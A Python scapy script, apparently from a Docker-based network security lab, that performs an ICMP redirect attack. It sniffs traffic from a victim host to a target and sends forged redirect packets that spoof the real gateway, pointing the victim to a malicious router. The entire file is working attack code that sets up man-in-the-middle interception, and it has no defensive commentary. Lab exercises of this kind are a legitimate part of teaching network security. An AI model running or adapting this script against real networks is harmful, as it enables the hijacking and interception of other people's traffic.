#!/usr/bin/env python3

from scapy.all import *
from scapy.layers.inet import IP, ICMP
import threading
import time

# Network configuration
victim = '10.9.0.5'
real_gateway = '10.9.0.11'
fake_gateway = '10.9.0.111'  # malicious router
target = '192.168.60.5'

print(f"🎯 ICMP Redirect Attack - Reactive Mode")
print(f"Victim: {victim}")
print(f"Real Gateway: {real_gateway}")
print(f"Fake Gateway: {fake_gateway}")
print(f"Target: {target}")
print("="*50)

def packet_handler(packet):
    """Handle captured packets and send redirects for victim traffic"""
    if packet.haslayer(IP):
        ip_layer = packet[IP]
        
        # Check if this is victim traffic to our target
        if ip_layer.src == victim and ip_layer.dst == target:
            print(f"📦 Intercepted: {ip_layer.src} -> {ip_layer.dst}")
            
            # Create ICMP redirect packet
            redirect = IP(src=real_gateway, dst=victim) / ICMP(type=5, code=1, gw=fake_gateway) / packet[IP]
            
            # Send the redirect
            send(redirect, verbose=0)
            print(f"📤 ICMP Redirect sent: telling {victim} to use {fake_gateway} for {target}")
            
            return True
    return False

def start_sniffing():
    """Start packet sniffing"""
    print("🔍 Starting packet capture...")
    print("💡 Now run: docker exec victim-10.9.0.5 ping 192.168.60.5")
    
    # Sniff packets on the network interface
    sniff(
        filter=f"host {victim} and host {target}",
        prn=packet_handler,
        store=0,
        timeout=60  # Run for 60 seconds
    )

if __name__ == "__main__":
    start_sniffing()
    print("✅ Attack completed")
